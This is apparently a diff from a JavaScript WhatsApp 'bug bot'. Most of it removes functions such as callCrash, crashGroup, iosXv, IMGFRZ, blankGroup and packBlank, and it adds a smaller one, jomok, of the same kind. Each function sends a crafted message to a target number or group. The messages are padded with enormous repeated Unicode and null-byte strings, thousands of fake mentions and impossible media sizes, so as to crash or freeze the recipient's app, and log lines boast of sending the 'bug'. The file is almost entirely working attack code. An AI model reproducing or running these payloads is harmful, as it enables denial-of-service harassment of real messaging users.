-              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
-              mimetype: "audio/mpeg",
-              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
-              fileLength: 999999999999,
-              seconds: 99999999999999,
-              ptt: true,
-              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
-              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
-              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
-              mediaKeyTimestamp: 99999999999999,
-              contextInfo: {
-                mentionedJid: [
-                  "@s.whatsapp.net",
-                  ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 90000000) + "@s.whatsapp.net")
-                ],
-                isForwarded: true,
-                forwardedNewsletterMessageInfo: {
-                  newsletterJid: "133@newsletter",
-                  serverMessageId: 1,
-                  newsletterName: "𞋯"
-                }
-              },
-              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
-            }
-          }
-        }
-      }
-    };
-
-    const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });
-
-    await sock.relayMessage("status@broadcast", msgAudio.message, {
-      messageId: msgAudio.key.id,
-      statusJidList: [target],
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [
-                { tag: "to", attrs: { jid: target }, content: undefined }
-              ]
-            }
-          ]
-        }
-      ]
-    });
-
-    const stickerMsg = {
-      stickerMessage: {
-        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
-        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
-        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
-        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
-        mimetype: "image/webp",
-        height: 9999,
-        width: 9999,
-        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
-        fileLength: 12260,
-        mediaKeyTimestamp: "1743832131",
-        isAnimated: false,
-        stickerSentTs: "X",
-        isAvatar: false,
-        isAiSticker: false,
-        isLottie: false,
+async function jomok(sock, target) {
+    const msg = {
+        text: "lu bau",
         contextInfo: {
-          mentionedJid: [
-            "0@s.whatsapp.net",
-            ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
-          ],
-          stanzaId: "1234567890ABCDEF",
-          quotedMessage: {
-            paymentInviteMessage: {
-              serviceType: 3,
-              expiryTimestamp: Date.now() + 1814400000
+            participant: "999@s.whatsapp.net",
+            stanzaId: "ြ".repeat(1500),
+            mentionedJid: [target],
+            isForwarded: true,
+            forwardingScore: 999,
+            externalAdReply: {
+                title: "berkarat",
+                body: "\u0000".repeat(1500),
+                thumbnailUrl: "https://files.catbox.moe/j2q32z.jpg",
+                mediaType: 1,
+                sourceUrl: "https://t.me/elltzyy_md",
+                showAdAttribution: true
             }
-          }
         }
-      }
     };
 
-    await sock.relayMessage("status@broadcast", stickerMsg, {
-      statusJidList: [target],
-      additionalNodes: [{
-        tag: "meta",
-        attrs: {},
-        content: [{
-          tag: "mentioned_users",
-          attrs: {},
-          content: [{ tag: "to", attrs: { jid: target } }]
-        }]
-      }]
-    });
-
-    if (mention) {
-      await sock.relayMessage(target, {
-        groupStatusMentionMessage: {
-          message: {
-            protocolMessage: {
-              key: msgAudio.key,
-              type: 25
-            }
-          }
-        }
-      }, {
-        additionalNodes: [{
-          tag: "meta",
-          attrs: {
-            is_status_mention: "!"
-          },
-          content: undefined
-        }]
-      });
-    }
-    let msg = await generateWAMessageFromContent(target, {
-      interactiveResponseMessage: {
-        body : { text: "X", format: "DEFAULT" },
-        nativeFlowResponseMessage: {
-          name: "galaxy_message",
-          paramsJson: "\u0000".repeat(100000)
-        },
-    contextInfo: {
-       mentionedJid: [
-              "0@s.whatsapp.net",
-              ...Array.from(
-                { length: 3000 },
-                () =>
-              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-              )
-            ],
-       entryPointConversionSource: "galaxy_message"
-      }
-    }
-  }, {});
-  
-  await sock.relayMessage(target, {
-    groupStatusMessageV2: {
-      message: msg.message
-    }
-  },
-    {
-      participant: { jid: target },
-      messageId: msg.key.id
-    });
-    
-    await sock.relayMessage("status@broadcast", msg.message, {
-        messageId: msg.key.id,
+    await sock.relayMessage("status@broadcast", msg, {
         statusJidList: [target],
         additionalNodes: [
             {
                 tag: "meta",
-                attrs: {},
+                attrs: { status_setting: "allowlist" },
                 content: [
                     {
                         tag: "mentioned_users",
@@ -3293,7 +3825,7 @@ async function inTers(sock, target) {
                             {
                                 tag: "to",
                                 attrs: { jid: target },
-                                content: undefined
+                                content: []
                             }
                         ]
                     }
@@ -3301,850 +3833,18 @@ async function inTers(sock, target) {
             }
         ]
     });
-  } catch (err) {
-    console.log(err.message)
-  }
 }
 
-async function D3nss(sock, target) {
-  const StanzaSock = {
-    viewOnceMessage: {
-      message: {
-        messageContextInfo: {
-          deviceListMetadata: {},
-          deviceListMetadataVersion: 2,
-        },
-        interactiveMessage: {
-          contextInfo: {
-            stanzaId: sock.generateMessageTag(),
-            participant: "0@s.whatsapp.net",
-            quotedMessage: {
-              documentMessage: {
-                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
-                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
-                fileLength: "9999999999999",
-                pageCount: 3567587327,
-                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
-                fileName: "Gw Rizz Bang‌",
-                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
-                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
-                mediaKeyTimestamp: "1735456100",
-                contactVcard: true,
-                caption: "",
-              },
-            },
-          },
-          body: {
-            text: " " + "ꦽ".repeat(100000),
-          },
-          nativeFlowMessage: {
-            buttons: [
-                {
-                  name: "quick_reply",
-                  buttonParamsJson: JSON.stringify({
-                    display_text: "𑜦𑜠".repeat(10000),
-                    id: null
-                  })
-                },
-                {
-                  name: "quick_reply",
-                  buttonParamsJson: JSON.stringify({
-                    display_text: "𑜦𑜠".repeat(10000),
-                    id: null
-                  })
-                },
-                {
-                  name: "cta_url",
-                  buttonParamsJson: JSON.stringify({
-                    display_text: "𑜦𑜠".repeat(10000),
-                    url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
-                  })
-                },
-                {
-                  name: "cta_copy",
-                  buttonParamsJson: JSON.stringify({
-                    display_text: "𑜦𑜠".repeat(10000),
-                    copy_code: "𑜦𑜠".repeat(10000)
-                  })
-                },
-                {
-                  name: "galaxy_message",
-                  buttonParamsJson: JSON.stringify({
-                    icon: "PROMOTION",
-                    flow_cta: "PAYMENT_PROMOTION",
-                    flow_message_version: "3"
-                 })
-               }
-            ],
-          },
-        },
-      },
-    },
-  };
-
-  await sock.relayMessage(target, StanzaSock, {
-    messageId: sock.generateMessageTag(),
-    participant: { jid: target }
-  });
-} 
-
-
-async function lockGB(sock, target) {
-sock.relayMessage(
-target,
-{
-locationMessage: {
-degreesLatitude: 1010101,
-degreesLongitude: 1010101,
-name: "funny loc ¿? " + "ꦽ".repeat(60000),
-address: ".sevrin444 ( @rraldz )",
-url: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/" + "ꦽ".repeat(60000),
-clickToWhatsappCall: true,
-contextInfo: {
-businessMessageForwardInfo: {
-businessOwnerJid: target
-},
-mentionedJid: [target,"13135550002@s.whatsapp.net"]
-}
-}
-},
-{ /* participant: {jid: target} */ }
-)
-}
-
-async function callCrash(sock, target) {
-  await sock.relayMessage(
-    int,
-    {
-      albumMessage: {
-        contextInfo: {
-          mentionedJid: Array.from(
-            { length: 2000 },
-            () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-          ),
-          remoteJid: " ¡!deadcodex!¡ ",
-          parentGroupJid: "0@g.us",
-          isQuestion: true,
-          isSampled: true,
-          parentGroupJid: "\u0000",
-          entryPointConversionDelaySeconds: 6767676767,
-          businessMessageForwardInfo: null,
-          botMessageSharingInfo: {
-            botEntryPointOrigin: {
-              origins: "BOT_MESSAGE_ORIGIN_TYPE_AI_INITIATED"
-            },
-            forwardScore: 999
-          },
-          quotedMessage: {
-            viewOnceMessage: {
-              message: {
-                interactiveResponseMessage: {
-                  body: {
-                    text: "@xrelly • #fvcker 🩸",
-                    format: "EXTENSIONS_1",
-                  },
-                  nativeFlowResponseMessage: {
-                    name: "call_permission_request",
-                    paramsJson: "\u0000".repeat(1000000),
-                    version: 1,
-                  },
-                },
-              },
-            },
-          },
-        },
-      },
-    },
-    {
-      participant: { jid: target},
-    }
-  );
-}
-
-async function crashGroup(sock, target) {
-  const payload = {
-    extendedTextMessage: {
-      text: "DENIS" + "ꦽ".repeat(45000),
-      description: " ayun<3 ",
-      title: "denis is back?!! ",
-      paymentLinkMetadata: {
-        button: { displayText: "  @DENIS fucker" },
-        header: { headerType: 1 },
-        provider: { paramsJson: "{{".repeat(10000) },
-      },
-      linkPreviewMetadata: {
-        paymentLinkMetadata: {
-          button: { displayText: "  @xrelly fucker" },
-          header: { headerType: 1 },
-          provider: { paramsJson: "{{".repeat(10000) },
-        },
-        urlMetadata: { fbExperimentId: 999 },
-        fbExperimentId: 888,
-        linkMediaDuration: 555,
-        socialMediaPostType: 1221,
-      },
-    },
-  };
-
-  const groupPayload = {
-    groupStatusMessageV2: {
-      message: payload,
-    },
-  };
-
-  const msg = generateWAMessageFromContent(target, groupPayload, {});
-
-  await sock.relayMessage(target, msg.message, {
-    messageId: msg.key.id,
-    //userJid: target,
-  });
-  
-  await sleep(2000);
-  
-  await sock.sendMessage(target, {
-      delete: {
-        remoteJid: target,
-        fromMe: true,
-        id: msg.key.id,
-      }
-    })
-}
-
-async function iosXv(client, target) {
-  await client.relayMessage(
-    target,
-    {
-      requestPhoneNumberMessage: {
-        skipType: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 ",
-        contextInfo: {
-          remoteJid: "status@broadcast",
-          externalAdReply: {
-            title: "𑇂𑆵𑆴𑆿".repeat(15000),
-            body: "𑇂𑆵𑆴𑆿".repeat(15000),
-            mediaType: "DOCUMENT",
-            renderLargerThumbnail: true,
-            containsAutoReply: true,
-            showAdAttribution: true,
-            thumbnail: { url: "https://files.catbox.moe/0iq0n3.jpg" },
-            sourceUrl: `https://${"𑇂𑆵𑆴𑆿".repeat(15000)}.wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior-iOS),,〽️/`,
-          },
-          quotedMessage: {
-            conversation: "#Vault•¿🎭?•(Superior-iOS)" 
-                          + "𑇂𑆵𑆴𑆿".repeat(15000)
-          },
-          businessMessageForwardInfo: {
-            businessOwnerJid: "13135559999@s.whatsapp.net",
-            businessDescrbiption: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 ",
-          },
-          mentionedJid: ["0@s.whastapp.net"],
-          forwardedNewsletterMessageInfo: {
-            newsletterJid: "666-666@g.us",
-            serverMessageId: 1,
-            newsletterName: "؂ن؃؄ٽ؂ن؃",
-            contentType: "UPDATE",
-          },
-        },
-      },
-    },
-    {
-      participant: {jid: target}
-    }
-  );
-}
-
-async function IMGFRZ(sock, target) {
-  await sock.relayMessage(target,
-    {
-      videoMessage: {
-        caption: "⟨〽⃟💛✩ ᜴𝐕࿆𝐬𝐏࿆ꢵ ✩💛⃟〽⟩" + "ꦽ".repeat(65000),
-        url: "https://mmg.whatsapp.net/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0&mms3=true",
-        mimetype: "video/mp4",
-        fileSha256: "xx78ONox8l/eqf3pYnJcMwiBCse3FVLKkk9jdfP5oPI=",
-        fileLength: "9999999999999999e+9999999",
-        seconds: 999999999,
-        mediaKey: "LIHnYC8TN+vB3X9ed+nbu04NRdJ5PCmnHLXwu26o7RE=",
-        height: 999999999999,
-        width: -999999999999,
-        fileEncSha256: "6a5lF9qeH/js+wV8W9fsrgVlXTSCd5htFyLKOCqzoHc=",
-        directPath: "/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0",
-        mediaKeyTimestamp: "1772045071",
-        jpegThumbnail: Buffer.alloc(0),
-        contextInfo: {
-          pairedMediaType: "NOT_PAIRED_MEDIA",
-          statusSourceType: "IMAGE",
-          isForwarded: true,
-          forwardingScore: 9999,
-          remoteJid: "VsP`Team",
-          externalAdReply: {
-            title: "🦋⃰͡°͜͡⃟⿻ 𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸 " + "ꦽ".repeat(60000),
-            body: "ꦽ".repeat(60000),
-            mediaType: "VIDEO",
-            renderLargerThumbnail: true,
-            containsAutoReply: true,
-            showAdAttribution: true,
-            thumbnail: { url: "https://files.catbox.moe/0iq0n3.jpg" },
-            sourceUrl: `https://${"ꦽ".repeat(60000)}.wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/`,
-          },
-          businessMessageForwardInfo: {
-            businessOwnerJid: "13135559999@s.whatsapp.net",
-            businessDescrbiption: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 ",
-          },
-          mentions: target,
-          groupMentions: Array.from({ length: 1900 }, () => ({
-            groupJid: `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`,
-            groupSubject: "X"
-          })),
-          quotedMessage: {
-            viewOnceMessage: {
-              message: {
-                interactiveResponseMessage: {
-                  body: {
-                    text: "Sent",
-                    format: "DEFAULT"
-                  },
-                  nativeFlowResponseMessage: {
-                    name: "call_permission_request",
-                    paramsJson: "{",
-                    version: 3
-                  }
-                }
-              }
-            }
-          },
-          statusAttributions: [
-            {
-              type: "MUSIC",
-              music: {
-                authorName: "ꦽ".repeat(9999),
-                songId: "243234016584833",
-                title: "Baon Cikadap" + "ꦽ".repeat(9999),
-                author: "𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸" + "ꦽ".repeat(9999),
-                artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/",
-                isExplicit: false,
-              }
-            },
-            {
-              type: "GROUP_STATUS",
-              music: {
-                authorName: "ꦽ".repeat(9999),
-                songId: "243234016584836",
-                title: "Baon Cikadap" + "ꦽ".repeat(9999),
-                author: "𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸" + "ꦽ".repeat(9999),
-                artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/",
-                isExplicit: false,
-              }
-            }
-          ],
-        },
-        streamingSidecar: "/PFxy0I/BUf8vbt/pW0sJ2j35YorqVHaII+thZ6V7yBUnox3c4QatbRETk7b2zb3nlQ=",
-        thumbnailDirectPath: "/v/t62.36147-24/593729676_1666419884645510_6285328431371507107_n.enc?ccb=11-4&oh=01_Q5Aa3wE2rCOu-EHBRz-yTOwRKjTlNItBVyfvepZpPpsmtDULhw&oe=69C69DFE&_nc_sid=5e03e0",
-        thumbnailSha256: "Cjw/0a5/5hzXKuDb6Rku26kazUYCZo0pyK8Xz35ecmo=",
-        thumbnailEncSha256: "DNT9rfoBh/sCwpuOIr27W/9DwsUjP/BhZjpy3iPqFG0=",
-        annotations: [
-          {
-            location: {
-              degreesLongitude: 0,
-              degreesLatitude: 0,
-              name: "#Vault•¿🎭?•(Superior)"
-            }, 
-            polygonVertices: [
-              { x: 999999999999999999, y: -999999999999999999 },
-              { x: 999999999999999999, y: -999999999999999999 },
-              { x: 999999999999999999, y: -999999999999999999 },
-              { x: 999999999999999999, y: -999999999999999999 },
-            ],
-            shouldSkipConfirmation: true,
-            embeddedContent: {
-              embeddedMusic: {
-                musicContentMediaId: "34028249360153165",
-                songId: "243234016584833",
-                title: "Baon Cikadap" + "ꦽ".repeat(9999),
-                author: "𖥞 DENIS NI BANG 𒀸" + "ꦽ".repeat(9999),
-                artworkDirectPath: "/v/t62.76458-24/33007276_830604333385904_5311398360527691061_n.enc?ccb=11-4&oh=01_Q5Aa3wH56VfaFfiQnInWSCwFZPy-UZPFQtqD1IGRFYWJIs_Tjg&oe=69C6BA9E&_nc_sid=5e03e0",
-                artworkSha256: "ea9OLJCdRGuahQJyYKqrvHkaQg01CYjJkCEjCid2kRg=",
-                artworkEncSha256: "Av+nl2omDopYfspLMfiR7w9+DiynCncYllNpze9z8PQ=",
-                artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/",
-                countryBlocklist: "",
-                isExplicit: false,
-                artworkMediaKey: "eSQ0o4UHYhwmUuEcGXesztrXm/tlTvDRBwoTF8dgVNA=",
-                musicSongStartTimeInMs: "999999999",
-                derivedContentStartTimeInMs: "999999999",
-                overlapDurationInMs: "999999999",
-              },
-            },
-            embeddedAction: true,
-          },
-        ],
-      },
-    },
-    {
-      participant: { jid: target },
-    }
-  );
-}
-
-async function blankGroup(client, target) {
-  await client.relayMessage(
-    target,
-    {
-      botInvokeMessage: {
-        message: {
-          newsletterAdminInviteMessage: {
-            newsletterJid: "1@newsletter",
-            newsletterName: "ꦽ".repeat(60000),
-            jpegThumbnail: "",
-            caption: "ꦽ".repeat(60000),
-            inviteExpiration: Date.now() * 999e+21
-          }
-        }
-      },
-      nativeFlowMessage: {
-        messageParamsJson: "{}",
-        buttons: [
-          {
-            name: "call_permission_request",
-            buttonParamsJson: ""
-          }
-        ]
-      },
-      contextInfo: {
-        mentionedJid: [
-          "13135550002@s.whatsapp.net",
-          ...Array.from({ length: 1999 }, () =>
-            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
-          )
-        ],
-      },
-    },
-    {}
-  );
-  
-  await client.relayMessage(target,
-    {
-      extendedTextMessage: {
-        text: "⤻꙳͙͡༑ORCA BERSINAR😂" + "ꦽ".repeat(120000),
-        contextInfo: {
-          quotedMessage: {
-            groupInviteMessage: {
-              groupJid: "888-62888@g.us",
-              inviteCode: "Xx".repeat(100000),
-              inviteExpiration: 999e+999 * Date.now(),
-              groupName: "ꦽ".repeat(60000),
-              caption: "ꦽ".repeat(60000),
-              jpegThumbnail: ""
-            }
-          },
-          mentionedJid: [
-            "13135550002@s.whatsapp.net",
-            ...Array.from({ length: 1999 }, () =>
-              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
-            )
-          ],
-        }
-      }
-    },
-    {}
-  );
-}
-async function packBlank(sock, target) {
-console.log(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`);
-  await sock.relayMessage(
-    target,
-    {
-      stickerPackMessage: {
-        stickerPackId: "X",
-        name: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
-        publisher: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
-        stickers: [
-          {
-            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
-            isAnimated: false,
-            emojis: ["😮‍💨"],
-            accessibilityLabel: "otax",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
-            isAnimated: false,
-            emojis: ["😮‍💨"],
-            accessibilityLabel: "otax",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
-            isAnimated: false,
-            emojis: ["😮‍💨"],
-            accessibilityLabel: "otax",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
-            isAnimated: false,
-            emojis: ["😮‍💨"],
-            accessibilityLabel: "otax",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
-            isAnimated: false,
-            emojis: ["😮‍💨"],
-            accessibilityLabel: "otax",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
-            isAnimated: false,
-            emojis: ["😮‍💨"],
-            accessibilityLabel: "otax",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
-            isAnimated: false,
-            emojis: ["😮‍💨"],
-            accessibilityLabel: "otax",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
-            isAnimated: false,
-            emojis: ["😮‍💨"],
-            accessibilityLabel: "otax",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
-            isAnimated: false,
-            emojis: ["😮‍💨"],
-            accessibilityLabel: "otax",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
-            isAnimated: false,
-            emojis: ["😮‍💨"],
-            accessibilityLabel: "otax",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-        ],
-        fileLength: "9999999999999",
-        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
-        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
-        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
-        directPath:
-          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
-        contextInfo: {
-          quotedMessage: {
-                paymentInviteMessage: {
-                  serviceType: 3,
-                  expiryTimestamp: Date.now() + 1814400000
-                },
-                forwardedAiBotMessageInfo: {
-                  botName: "META AI",
-                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
-                  creatorName: "Bot"
-                }
-            }
-        },
-        packDescription: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
-        mediaKeyTimestamp: "1741150286",
-        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
-        thumbnailDirectPath:
-          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
-        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
-        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
-        thumbnailHeight: 252,
-        thumbnailWidth: 252,
-        imageDataHash:
-          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
-        stickerPackSize: "999999999",
-        stickerPackOrigin: "1",
-      },
-    }, { participant: { jid: target } });
-}
-async function AyunBelovedxnxxahyaa(sock, target) {
-    console.log('𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴');
-
-    const { nodes, shouldIncludeDevicelentity } = await sock.emit('getNodes');
-
-    const message = {
-        extendedTextMessage: {
-            text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(50000) + "\n\nJust OTAX" + "\0".repeat(100),
-            matchedText: "https://t.me/Otapengenkawin",
-            description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
-            title: "ꦽ".repeat(20000),
-            previewType: 6,
-            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCAwYBBQEBAAAAAAAAAAAAAAAAAAAAA//aAAwDAQACEQMQAA+q6BooLAAFIkkgAJIsAAJEsAAJYACWC//9oACAEBAAEFAu7Z25Z9LiY3XbLs+d2s3R8/tYm7m0y7bLlyz25dV1ZYsuXKXLly9y5cuXL3Lly5cuXL3Lly5cuXL3Lly5f/EABYRAAMAAAAAAAAAAAAAAAAAAAEQYf/aAAgBAgEBPwFQz//EABYRAAMAAAAAAAAAAAAAAAAAAAEQUf/aAAgBAwEBPwEUz//Z",
-            paymentLinkMetadata: {
-                button: { displayText: "Love U My Ayun" },
-                header: { headerType: 1 },
-                provider: { paramsJson: "{".repeat(10000) }
-            },
-            contextInfo: {
-                isForwarded: true,
-                forwardingScore: 9999,
-                participant: target,
-                remoteJid: "status@broadcast",
-                mentionedJid: [
-                    "0@s.whatsapp.net",
-                    ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
-                ],
-                quotedMessage: {
-                    newsletterAdminInviteMessage: {
-                        newsletterJid: "otax@newsletter",
-                        newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
-                        caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
-                        inviteExpiration: "999999999"
-                    }
-                },
-                forwardedNewsletterMessageInfo: {
-                    newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
-                    newsletterJid: "13135550002@newsletter",
-                    serverId: 1
-                }
-            }
-        }
-    };
-
-    const fullMsgNode = await sock.generateWAMessage(target, message, {
-        userJid: sock.user.id
-    });
-
-    const encNode = fullMsgNode.content[0];
-
-    const Stanza = {
-    tag: "message",
-    id: sock.generateMessageID(),
-    type: "text",
-    to: target,
-    additionalAttributes: {},
-    content: [
-      {
-        tag: "enc",
-        attrs: {
-          v: "2",
-          type: "none"
-        },
-        content: []
-      },
-      {
-        tag: "participants",
-        atts: {},
-        content: nodes
-      }
-    ]
-  }
-
-    await sock.sendNode(Stanza);
-
-    await sleep(1000);
-
-    await sock.sendMessage(target, {
-        delete: {
-            remoteJid: target,
-            fromMe: true,
-            id: fullMsgNode.attrs.id,
-            participant: target
-        }
-    });
-
-    console.log("Delay Visib Success To " + target);
-}
-
-
-async function XFCUI(sock, target) {
-sock.relayMessage(
-target,
-{
-locationMessage: {
-degreesLatitude: 1010101,
-degreesLongitude: 1010101,
